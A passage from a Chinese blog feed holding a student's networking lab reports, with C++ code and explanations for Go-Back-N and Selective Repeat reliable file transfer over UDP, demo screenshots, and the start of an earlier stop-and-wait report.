class="hljs-built_in">memset</span>(data, <span class="hljs-number">0</span>, MAX_SIZE);    }};<span class="hljs-meta">#<span class="hljs-keyword">pragma</span> pack()</span></code></pre></div></div><p><code>#pragma pack(1)</code>用于指示结构体内容按1Byte对齐，以保证报文大小是我们期望的紧凑形式。</p><h4 id="建连和断连">建连和断连</h4><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C3.2-%E5%9F%BA%E4%BA%8EUDP%E6%9C%8D%E5%8A%A1%E8%AE%BE%E8%AE%A1%E5%8F%AF%E9%9D%A0%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AE%E6%B5%81%E9%87%8F%E6%8E%A7%E5%88%B6/20230828210448681529_442_20221210213259977349_103_image-20221119154308774.png" alt="image-20221119154308774"><figcaption aria-hidden="true">image-20221119154308774</figcaption></figure><p>建连和断连过程与3.1无太大变化。主要是在建连过程中增加了接收方初始窗口大小的通告。</p><h3 id="流程设计">流程设计</h3><p>程序支持一次建连发送多个文件。</p><p>本次实验与上次相比，整体逻辑没有变化，但序列号递增使用。在本次实验中序列号为<code>u_int</code>类型，可存储<span class="math inline">\(2^{32}\)</span>个序列号，每个数据包最大为<span class="math inline">\(1024\)</span>即<span class="math inline">\(2^{10}\)</span>字节，理论上最大可传输<span class="math inline">\(2^{42}=4TB\)</span>的单个文件。当然，由于在本实验中因为使用<code>option</code>字段存储文件长度，所以实际上能传输的最大长度是<span class="math inline">\(2^{32}\)</span>字节即即<span class="math inline">\(4GB\)</span>。总之，在不考虑可拓展性的前提下，不需循环使用序列号即可满足目前文件传输的需求。</p><h2 id="程序代码解释">程序代码解释</h2><h3 id="文件发送过程">文件发送过程</h3><h4 id="gbn">GBN</h4><p>下面先以基础的GBN为基础分析程序代码：</p><h5 id="发送端">发送端</h5><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C3.2-%E5%9F%BA%E4%BA%8EUDP%E6%9C%8D%E5%8A%A1%E8%AE%BE%E8%AE%A1%E5%8F%AF%E9%9D%A0%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AE%E6%B5%81%E9%87%8F%E6%8E%A7%E5%88%B6/20230828210450479476_331_20221210213515660596_123_image-20221210115848469.png" alt="image-20221210115848469"><figcaption aria-hidden="true">image-20221210115848469</figcaption></figure><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C3.2-%E5%9F%BA%E4%BA%8EUDP%E6%9C%8D%E5%8A%A1%E8%AE%BE%E8%AE%A1%E5%8F%AF%E9%9D%A0%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AE%E6%B5%81%E9%87%8F%E6%8E%A7%E5%88%B6/20230828210451463902_386_20221210213517155143_340_image-20221210115903632.png" alt="image-20221210115903632"><figcaption aria-hidden="true">image-20221210115903632</figcaption></figure><p>课件中讲述也很直观，对照伪代码实现即可。</p><h6 id="发送进程主进程">发送进程（主进程）</h6><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-8ikolnlmrh9u6a"></i><span>c++</span><div class="collapse show" id="collapse-8ikolnlmrh9u6a"><pre><code class="hljs c++"><span class="hljs-comment">//wasted space but saved time for "shifting" sndpkt window</span><span class="hljs-keyword">auto</span> *sndpkt = <span class="hljs-keyword">new</span> packet[pkt_total + <span class="hljs-number">1</span>];<span class="hljs-keyword">while</span> (base &lt; pkt_total) {    <span class="hljs-comment">//send packets</span>    <span class="hljs-keyword">if</span> (nextseqnum &lt; base + N &amp;&amp; nextseqnum &lt; pkt_total) {        pkt_data_size = <span class="hljs-built_in">min</span>(MAX_SIZE, file_len - nextseqnum * MAX_SIZE);        sndpkt[nextseqnum] = <span class="hljs-built_in">make_pkt</span>(DATA, nextseqnum, pkt_data_size, file_data + nextseqnum * MAX_SIZE);        <span class="hljs-built_in">udt_send</span>(sndpkt[nextseqnum]);        cout &lt;&lt; <span class="hljs-string">"Sent packet "</span> + <span class="hljs-built_in">to_string</span>(nextseqnum) + <span class="hljs-string">" "</span>;        <span class="hljs-keyword">if</span> (base == nextseqnum) {            timer.<span class="hljs-built_in">start_timer</span>();        }        nextseqnum++;        <span class="hljs-built_in">print_window</span>();    }    <span class="hljs-comment">//handle timeout</span>    <span class="hljs-keyword">if</span> (timer.<span class="hljs-built_in">timeout</span>()) {        <span class="hljs-built_in">print_message</span>(<span class="hljs-string">"Timeout, resend packets from "</span> + <span class="hljs-built_in">to_string</span>(base) + <span class="hljs-string">" to "</span> + <span class="hljs-built_in">to_string</span>(nextseqnum - <span class="hljs-number">1</span>),                      WARNING);        <span class="hljs-keyword">for</span> (u_int i = base; i &lt; nextseqnum; i++) {            <span class="hljs-built_in">udt_send</span>(sndpkt[i]);        }        timer.<span class="hljs-built_in">start_timer</span>();    }}</code></pre></div></div><p>这一部分逻辑与状态机中右上角两个部分完全一致。其中<code>timer</code>是一个全局的计时器，为自己编写的类。用法可以顾名思义。<code>print_window();</code>按照<code>[base|nexeseqnum|base+n]</code>的格式将当前窗口状态打印出来。</p><h6 id="接收进程">接收进程</h6><p>接收进程在发送之前创建。实现如下：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-61czynlmrh9u6a"></i><span>c++</span><div class="collapse show" id="collapse-61czynlmrh9u6a"><pre><code class="hljs c++"><span class="hljs-function">DWORD WINAPI <span class="hljs-title">handle_ACK</span><span class="hljs-params">(LPVOID lpParam)</span> </span>{    packet rcvpkt;    <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) {        <span class="hljs-comment">//non-blocking rdt_rcv (if not rcv any packet it, it will return 0)</span>        <span class="hljs-keyword">while</span> (!<span class="hljs-built_in">rdt_rcv</span>(rcvpkt) || <span class="hljs-built_in">corrupt</span>(rcvpkt) || !<span class="hljs-built_in">isACK</span>(rcvpkt)) {            <span class="hljs-comment">//the packet must be ACK and not corrupt to jump out of the loop</span>        }<span class="hljs-comment">//        base = get_ack_num(rcvpkt) + 1;</span>        acked[<span class="hljs-built_in">get_ack_num</span>(rcvpkt)] = <span class="hljs-literal">true</span>;        <span class="hljs-keyword">while</span> (acked[base]) {            base++;        }        cout &lt;&lt; <span class="hljs-string">"Received ACK "</span> + <span class="hljs-built_in">to_string</span>(<span class="hljs-built_in">get_ack_num</span>(rcvpkt)) + <span class="hljs-string">" "</span>;        <span class="hljs-built_in">print_window</span>();        <span class="hljs-keyword">if</span> (base == pkt_total) {            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;        }        <span class="hljs-keyword">if</span> (base == nextseqnum) {            timer.<span class="hljs-built_in">stop_timer</span>();            <span class="hljs-keyword">continue</span>;        } <span class="hljs-keyword">else</span> {            timer.<span class="hljs-built_in">start_timer</span>();        }    }}</code></pre></div></div><p>这一部分助教思考的也非常深入：虽然实验环境下ACK不会丢失且能按序到达，但真实的网络环境下ACK也会丢失，且由于传输速度可能不一样快，ACK未必是按序到达的。这一点在上一次实验的握手建连部分考虑到了且有所叙述（接收方在确认握手成功后也有可能因为ACK丢失而收到发送方重发的握手包），但这一次实验囿于伪代码的惯性思维没有考虑周全，感谢助教提醒指正。</p><p>因此此处可参考后续SR的实现，移动时不能简单的移动到当前收到的序号+1，而是从base开始移动到按序收到的包序号之后，即：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-d0q07blmrh9u6a"></i><span>c++</span><div class="collapse show" id="collapse-d0q07blmrh9u6a"><pre><code class="hljs c++"><span class="hljs-comment">//        base = get_ack_num(rcvpkt) + 1;</span>        acked[<span class="hljs-built_in">get_ack_num</span>(rcvpkt)] = <span class="hljs-literal">true</span>;        <span class="hljs-keyword">while</span> (acked[base]) {            base++;        }</code></pre></div></div><p>当然这也需要把收到包的状态保存为数组。此处的空间复杂度还可以优化，也即实际上我们只需要窗口内的ACK状态即可，但这样就伴随着较为费时的“移动”。因此此处直接将所有状态都保存了下来。</p><h5 id="接收端">接收端</h5><p>接收端的变化主要一个是将窗口通告给发送方。这个任务只需要修改<code>make_pkt</code>即可，不再赘述。</p><p>另外一个是接收发送方数据的逻辑。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C3.2-%E5%9F%BA%E4%BA%8EUDP%E6%9C%8D%E5%8A%A1%E8%AE%BE%E8%AE%A1%E5%8F%AF%E9%9D%A0%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AE%E6%B5%81%E9%87%8F%E6%8E%A7%E5%88%B6/20230828210452765370_923_20221210213518957536_859_image-20221210123705619.png" alt="image-20221210123705619"><figcaption aria-hidden="true">image-20221210123705619</figcaption></figure><p>代码如下所示：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-jipjrnlmrh9u6a"></i><span>C++</span><div class="collapse show" id="collapse-jipjrnlmrh9u6a"><pre><code class="hljs C++"><span class="hljs-keyword">while</span> (<span class="hljs-built_in">rdt_rcv</span>(rcvpkt)) {    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">not_corrupt</span>(rcvpkt)) {        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">hasseqnum</span>(rcvpkt, expectedseqnum)) {            pkt_data_size = rcvpkt.head.data_size;            <span class="hljs-built_in">memcpy</span>(file_buffer + received_file_len, rcvpkt.data, pkt_data_size);            received_file_len += pkt_data_size;            packet sndpkt = <span class="hljs-built_in">make_pkt</span>(ACK,expectedseqnum);            <span class="hljs-built_in">udt_send</span>(sndpkt);            <span class="hljs-built_in">print_message</span>(<span class="hljs-string">"Received packet "</span> + <span class="hljs-built_in">to_string</span>(expectedseqnum), DEBUG);            expectedseqnum++;        } <span class="hljs-keyword">else</span> {            <span class="hljs-comment">//discard the packet and wait for the next one</span>            <span class="hljs-built_in">print_message</span>(<span class="hljs-string">"Received a out-of-order packet"</span>, WARNING);            <span class="hljs-keyword">continue</span>;        }    } <span class="hljs-keyword">else</span> {        <span class="hljs-built_in">print_message</span>(<span class="hljs-string">"Received a corrupt packet"</span>, DEBUG);        <span class="hljs-keyword">continue</span>;    }    <span class="hljs-keyword">if</span> (received_file_len == file_size) {        ...file received, writing file to the disk...    }}</code></pre></div></div><p>可以从状态机看到，我们只需要关注<code>expectedseqnum</code>对应的包即可，其他的包收到直接丢弃即可。这一部分并不复杂，对照状态机容易理解。</p><p>另外，在状态机中没有”失序重发ACK，确认按序正确接收的最高序号分组“对应的部分。事实上本次实验不重发ACK对正确性没有影响，但其对于拥塞控制来说是必须的。</p><h4 id="sr">SR</h4><p>在这次实验中也额外实现了SR选择重传流水线协议。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C3.2-%E5%9F%BA%E4%BA%8EUDP%E6%9C%8D%E5%8A%A1%E8%AE%BE%E8%AE%A1%E5%8F%AF%E9%9D%A0%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AE%E6%B5%81%E9%87%8F%E6%8E%A7%E5%88%B6/20230828210454088467_865_20221210213520764848_548_image-20221210200312667.png" alt="image-20221210200312667"><figcaption aria-hidden="true">image-20221210200312667</figcaption></figure><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C3.2-%E5%9F%BA%E4%BA%8EUDP%E6%9C%8D%E5%8A%A1%E8%AE%BE%E8%AE%A1%E5%8F%AF%E9%9D%A0%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AE%E6%B5%81%E9%87%8F%E6%8E%A7%E5%88%B6/20230828210455168753_804_20221210213542209437_469_image-20221210201321172.png" alt="image-20221210201321172"><figcaption aria-hidden="true">image-20221210201321172</figcaption></figure><h5 id="发送端-1">发送端</h5><p>发送端相比GBN，需要为每一个分组都加入定时器。一开始是希望每一个包发出后都创建一个相同进程用于监听ACK并处理超时事件，但实践中发现由于，传入的<code>packet</code>地址会在发送过程中被修改，在线程中无法正确每个线程获取需要等待的分组的序号和内容。因此转而采用线程池的方式进行实现，每个线程维护自己的定时器和需要重发的分组。代码如下所示：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-v30xbjlmrh9u6a"></i><span>C++</span><div class="collapse show" id="collapse-v30xbjlmrh9u6a"><pre><code class="hljs C++"><span class="hljs-comment">//wasted space but saved time for "shifting" sndpkt window</span><span class="hljs-type">clock_t</span> single_file_timer = <span class="hljs-built_in">clock</span>();<span class="hljs-keyword">while</span> (base &lt; pkt_total) {    <span class="hljs-comment">//send packets</span>    <span class="hljs-keyword">if</span> (nextseqnum &lt; base + N &amp;&amp; nextseqnum &lt; pkt_total) {        pkt_data_size = <span class="hljs-built_in">min</span>(MAX_SIZE, file_len - nextseqnum * MAX_SIZE);        sndpkt_buffer[nextseqnum] = <span class="hljs-built_in">make_pkt</span>(DATA, nextseqnum, pkt_data_size,                                             file_data + nextseqnum * MAX_SIZE);        <span class="hljs-built_in">udt_send</span>(sndpkt_buffer[nextseqnum]);        cout &lt;&lt; <span class="hljs-string">"Sent packet "</span> + <span class="hljs-built_in">to_string</span>(nextseqnum) + <span class="hljs-string">" "</span>;        <span class="hljs-built_in">print_window</span>();        thread_pool[nextseqnum] = <span class="hljs-built_in">CreateThread</span>(<span class="hljs-literal">nullptr</span>, <span class="hljs-number">0</span>, SR, &amp;sndpkt_buffer[nextseqnum], <span class="hljs-number">0</span>, <span class="hljs-literal">nullptr</span>);        nextseqnum++;    }}</code></pre></div></div><p>其中<code>SR</code>线程的实现思路如下：</p><p><code>acked</code>数组中保存了当前分组确认的状态，和GBN中所叙述的类似。这个数组的内容由接收线程（与GBN相同，但只标记<code>acked</code>数组状态，不进行窗口滑动）进行修改。当第<code>wait_seq</code>个包对应的SR线程发现监听到了对应<code>acked</code>数组变化（即<code>接收ACK(n)</code>）判断是否进行窗口滑动。若超时，则重发对应的包，重启定时器。</p><p>下面是对应的代码：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-ppn07ilmrh9u6a"></i><span>C++</span><div class="collapse show" id="collapse-ppn07ilmrh9u6a"><pre><code class="hljs C++"><span class="hljs-function">DWORD WINAPI <span class="hljs-title">SR</span><span class="hljs-params">(LPVOID lpParam)</span> </span>{    packet sndpkt = *<span class="hljs-built_in">reinterpret_cast</span>&lt;packet *&gt;(lpParam);    u_int wait_seq = sndpkt.head.seq;    <span class="hljs-type">int</span> resend_times = <span class="hljs-number">0</span>;    <span class="hljs-comment">//start a timer</span>    <span class="hljs-type">clock_t</span> start = <span class="hljs-built_in">clock</span>();    <span class="hljs-keyword">while</span> (!acked[wait_seq]) {        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">timeout</span>(start)) {            <span class="hljs-built_in">udt_send</span>(sndpkt);            start = <span class="hljs-built_in">clock</span>();            <span class="hljs-keyword">if</span> (resend_times &gt; MAX_RESEND_TIMES) {                <span class="hljs-built_in">print_message</span>(<span class="hljs-string">"Resend times exceed the limit, there must be something wrong with the network"</span>, ERR);                <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;            } <span class="hljs-keyword">else</span> {                cout &lt;&lt; <span class="hljs-string">"Resend packet "</span> + <span class="hljs-built_in">to_string</span>(sndpkt.head.seq) + <span class="hljs-string">" "</span>;                <span class="hljs-built_in">print_window</span>();                resend_times++;            }        }    }    <span class="hljs-comment">//if reach here, the packet is ACKed</span>    <span class="hljs-keyword">if</span> (wait_seq == base) {        <span class="hljs-comment">//if the ACKed packet is the base, move the window to the first unACKed packet</span>        <span class="hljs-keyword">while</span> (acked[base]) {            base++;        }    }    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;}</code></pre></div></div><h5 id="接收端-1">接收端</h5><p>接收端比GBN的情况要复杂一些，因为需要缓存失序的包。实现如下：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-o17oghlmrh9u6a"></i><span>C++</span><div class="collapse show" id="collapse-o17oghlmrh9u6a"><pre><code class="hljs C++"><span class="hljs-comment">//"blocking receive" here</span><span class="hljs-keyword">while</span> (<span class="hljs-built_in">rdt_rcv</span>(rcvpkt)) {    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">not_corrupt</span>(rcvpkt)) {        u_int pkt_seq = rcvpkt.head.seq;        <span class="hljs-keyword">if</span> (pkt_seq &gt;= rcv_base &amp;&amp; pkt_seq &lt; rcv_base + N) {            <span class="hljs-comment">//in the window</span>            <span class="hljs-keyword">if</span> (!acked[pkt_seq]) {                <span class="hljs-keyword">if</span> (pkt_seq == rcv_base) {                    <span class="hljs-comment">//the first packet in the window</span>                    pkt_data_size = rcvpkt.head.data_size;                    <span class="hljs-built_in">memcpy</span>(file_buffer + pkt_seq * MAX_SIZE, rcvpkt.data, pkt_data_size);                    acked[pkt_seq] = <span class="hljs-literal">true</span>;                    packet sndpkt = <span class="hljs-built_in">make_pkt</span>(ACK, rcv_base);                    <span class="hljs-built_in">udt_send</span>(sndpkt);                    <span class="hljs-built_in">print_message</span>(<span class="hljs-string">"Received packet "</span> + <span class="hljs-built_in">to_string</span>(pkt_seq), DEBUG);                    <span class="hljs-comment">//slide the window</span>                    <span class="hljs-keyword">while</span> (acked[rcv_base]) {                        rcv_base++;                    }                } <span class="hljs-keyword">else</span> {                    <span class="hljs-comment">//not the first packet in the window, cache it</span>                    pkt_data_size = rcvpkt.head.data_size;                    <span class="hljs-built_in">memcpy</span>(file_buffer + pkt_seq * MAX_SIZE, rcvpkt.data, pkt_data_size);                    acked[pkt_seq] = <span class="hljs-literal">true</span>;                    packet sndpkt = <span class="hljs-built_in">make_pkt</span>(ACK, pkt_seq);                    <span class="hljs-built_in">udt_send</span>(sndpkt);                    <span class="hljs-built_in">print_message</span>(<span class="hljs-string">"Received packet "</span> + <span class="hljs-built_in">to_string</span>(pkt_seq)+<span class="hljs-string">", cached"</span>, DEBUG);                }            } <span class="hljs-keyword">else</span> {                <span class="hljs-comment">//already acked in the window, resend the ack</span>                <span class="hljs-built_in">print_message</span>(<span class="hljs-string">"Received packet "</span> + <span class="hljs-built_in">to_string</span>(pkt_seq) + <span class="hljs-string">" again"</span>, WARNING);                <span class="hljs-comment">//send ack</span>                packet sndpkt = <span class="hljs-built_in">make_pkt</span>(ACK, pkt_seq);                <span class="hljs-built_in">udt_send</span>(sndpkt);                <span class="hljs-built_in">print_message</span>(<span class="hljs-string">"Sent ack "</span> + <span class="hljs-built_in">to_string</span>(pkt_seq), DEBUG);            }        } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ((pkt_seq &gt;= rcv_base - N) &amp;&amp; (pkt_seq &lt; rcv_base)) {            <span class="hljs-comment">//out of the window, but in the buffer</span>            <span class="hljs-built_in">print_message</span>(<span class="hljs-string">"Received packet "</span> + <span class="hljs-built_in">to_string</span>(pkt_seq) + <span class="hljs-string">" again"</span>, WARNING);            <span class="hljs-comment">//send ack</span>            packet sndpkt = <span class="hljs-built_in">make_pkt</span>(ACK, pkt_seq);            <span class="hljs-built_in">udt_send</span>(sndpkt);            <span class="hljs-built_in">print_message</span>(<span class="hljs-string">"Sent ack "</span> + <span class="hljs-built_in">to_string</span>(pkt_seq), DEBUG);        } <span class="hljs-keyword">else</span> {            <span class="hljs-comment">//out of the window and buffer</span>            <span class="hljs-built_in">print_message</span>(<span class="hljs-string">"Received packet "</span> + <span class="hljs-built_in">to_string</span>(pkt_seq) + <span class="hljs-string">" out of the window"</span>, WARNING);            <span class="hljs-comment">//do nothing</span>        }    } <span class="hljs-keyword">else</span> {        <span class="hljs-built_in">print_message</span>(<span class="hljs-string">"Received a corrupt packet"</span>, DEBUG);        <span class="hljs-keyword">continue</span>;    }    <span class="hljs-keyword">if</span> (rcv_base * MAX_SIZE &gt;= file_size) {        ...file received, writing file to the disk...    }}</code></pre></div></div><p>虽然代码较长，但无非是区分了接收的分组在窗口内，窗口之前或者超出了缓冲区三种情况。</p><h2 id="程序演示">程序演示</h2><h3 id="建立连接">建立连接</h3><p>路由器设置：</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C3.2-%E5%9F%BA%E4%BA%8EUDP%E6%9C%8D%E5%8A%A1%E8%AE%BE%E8%AE%A1%E5%8F%AF%E9%9D%A0%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AE%E6%B5%81%E9%87%8F%E6%8E%A7%E5%88%B6/20230828210456392083_724_20221210213544187165_779_image-20221119185527966.png" alt="image-20221119185527966"><figcaption aria-hidden="true">image-20221119185527966</figcaption></figure><p>流程展示在上一次实验已经展示的比较完善。本次实验主要演示有丢包延时条件下的发送情况。</p><h3 id="gbn流水线协议">GBN流水线协议</h3><p>可以看到发送方当发现超时候会将<code>base</code>到<code>nextseqnum</code>之间的包全部重发。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C3.2-%E5%9F%BA%E4%BA%8EUDP%E6%9C%8D%E5%8A%A1%E8%AE%BE%E8%AE%A1%E5%8F%AF%E9%9D%A0%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AE%E6%B5%81%E9%87%8F%E6%8E%A7%E5%88%B6/20230828210457628384_330_20221210213545630220_743_image-20221210212155885.png" alt="image-20221210212155885"><figcaption aria-hidden="true">image-20221210212155885</figcaption></figure><p>接收方也能判断失序的分组：</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C3.2-%E5%9F%BA%E4%BA%8EUDP%E6%9C%8D%E5%8A%A1%E8%AE%BE%E8%AE%A1%E5%8F%AF%E9%9D%A0%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AE%E6%B5%81%E9%87%8F%E6%8E%A7%E5%88%B6/20230828210458802437_390_20221210213547529597_432_image-20221210212321733.png" alt="image-20221210212321733"><figcaption aria-hidden="true">image-20221210212321733</figcaption></figure><h3 id="sr流水线协议">SR流水线协议</h3><p>在SN协议的实践中，发现发送方会经常由于超时重发接收方能够收到的包。猜测是由于接收方串行接收且接收的逻辑比发送方发送的逻辑复杂，导致了接收的速度跟不上发送的速度。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C3.2-%E5%9F%BA%E4%BA%8EUDP%E6%9C%8D%E5%8A%A1%E8%AE%BE%E8%AE%A1%E5%8F%AF%E9%9D%A0%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AE%E6%B5%81%E9%87%8F%E6%8E%A7%E5%88%B6/20230828210500124097_756_20221210213549149283_237_image-20221210211645995.png" alt="image-20221210211645995"><figcaption aria-hidden="true">image-20221210211645995</figcaption></figure><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C3.2-%E5%9F%BA%E4%BA%8EUDP%E6%9C%8D%E5%8A%A1%E8%AE%BE%E8%AE%A1%E5%8F%AF%E9%9D%A0%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AE%E6%B5%81%E9%87%8F%E6%8E%A7%E5%88%B6/20230828210501145708_569_20221210213550895116_592_image-20221210211627874.png" alt="image-20221210211627874"><figcaption aria-hidden="true">image-20221210211627874</figcaption></figure><p>因此尝试略微调大超时时间（3*MAX_TIME）可以看到正常的接收发送过程。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C3.2-%E5%9F%BA%E4%BA%8EUDP%E6%9C%8D%E5%8A%A1%E8%AE%BE%E8%AE%A1%E5%8F%AF%E9%9D%A0%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AE%E6%B5%81%E9%87%8F%E6%8E%A7%E5%88%B6/20230828210502268709_563_20221210213552672768_860_image-20221210211424408.png" alt="image-20221210211424408"><figcaption aria-hidden="true">image-20221210211424408</figcaption></figure><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C3.2-%E5%9F%BA%E4%BA%8EUDP%E6%9C%8D%E5%8A%A1%E8%AE%BE%E8%AE%A1%E5%8F%AF%E9%9D%A0%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AE%E6%B5%81%E9%87%8F%E6%8E%A7%E5%88%B6/20230828210503315103_408_20221210213554281337_662_image-20221210211449133.png" alt="image-20221210211449133"><figcaption aria-hidden="true">image-20221210211449133</figcaption></figure><p>发送成功！</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C3.2-%E5%9F%BA%E4%BA%8EUDP%E6%9C%8D%E5%8A%A1%E8%AE%BE%E8%AE%A1%E5%8F%AF%E9%9D%A0%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AE%E6%B5%81%E9%87%8F%E6%8E%A7%E5%88%B6/20230828210504699432_552_20221210213555912889_771_image-20221210212403935.png" alt="image-20221210212403935"><figcaption aria-hidden="true">image-20221210212403935</figcaption></figure><p>GitHub:</p><p>https://github.com/Lunaticsky-tql/rdt_on_udp</p><p>GBN对应lab3.2分支，SR对应lab3.2-SR分支。</p>]]></content>
    
    
    <categories>
      
      <category>作业</category>
      
    </categories>
    
    
    <tags>
      
      <tag>寄网</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>计算机网络实验3.1-基于UDP服务设计可靠传输协议</title>
    <link href="/posts/24837/"/>
    <url>/posts/24837/</url>
    
    <content type="html"><![CDATA[<h1 id="计算机网络实验3.1-基于udp服务设计可靠传输协议停等版本">计算机网络实验3.1-基于UDP服务设计可靠传输协议(停等版本)</h1><h2 id="实验要求">实验要求</h2><p>利用数据报套接字在用户空间实现面向连接的可靠数据传输，功能包括：建立连接、差错检测、确认重传等。流量控制采用停等机制，完成给定测试文件的传输。</p><h2 id="程序流程展示">程序流程展示</h2><h3 id="协议设计">协议设计</h3><p>在本次实验中采用基于rdt3.0的协议设计。</p><h4 id="报文结构">报文结构</h4><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C3.1-%E5%9F%BA%E4%BA%8EUDP%E6%9C%8D%E5%8A%A1%E8%AE%BE%E8%AE%A1%E5%8F%AF%E9%9D%A0%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AE/20230828210903686515_997_20221119192011936961_320_image-20221119150328876.png" alt="image-20221119150328876"><figcaption aria-hidden="true">image-20221119150328876</figcaption></figure><p>如图所示，报文头长度共<code>128Bits</code>。下面介绍报文结构设计的思路。</p><p>首先，注意到我们的实验只需要从客户端到服务器单向传输数据，因此我们事实上整个实验只需要一个序列号字段即可满足需求。对于发送端对应<code>TCP</code>中的<code>seq</code>,接收端对应<code>TCP</code>中的<code>ack</code>。</p><p>下面是十六位校验和以及数据报字段长度，与<code>TCP</code>相同。</p><p>目前使用<code>u_short</code>来存放<code>flag</code>。其字段含义如下：</p><p><code>F</code>:<code>FIN</code></p><p><code>S</code>:<code>SYN</code></p><p><code>A</code>:<code>ACK</code></p><p><code>H</code>:<code>FILE_HEAD</code></p><p><code>FILE_HEAD</code>用于指示接收端此报文包含文件信息的字段。</p><p><code>window_size</code>本次实验还没有用到。</p><p><code>option</code>为可选字段，在本次实验中暂时用于存放文件名。</p><p><code>data</code>的最大长度可以调节，本次实验定义为1024字节。</p><p>此部分定义代码段如下;</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-fooabrlmrh9u6a"></i><span>c++</span><div class="collapse show" id="collapse-fooabrlmrh9u6a"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX_SIZE 1024</span><span class="hljs-meta">#<span class="hljs-keyword">define</span> DATA 0x0</span><span class="hljs-meta">#<span class="hljs-keyword">define</span> FIN 0x1</span><span class="hljs-meta">#<span class="hljs-keyword">define</span> SYN 0x2</span><span class="hljs-meta">#<span class="hljs-keyword">define</span> ACK 0x4</span><span class="hljs-meta">#<span class="hljs-keyword">define</span> ACK_SYN 0x6</span><span class="hljs-meta">#<span class="hljs-keyword">define</span> ACK_FIN 0x5</span><span class="hljs-meta">#<span 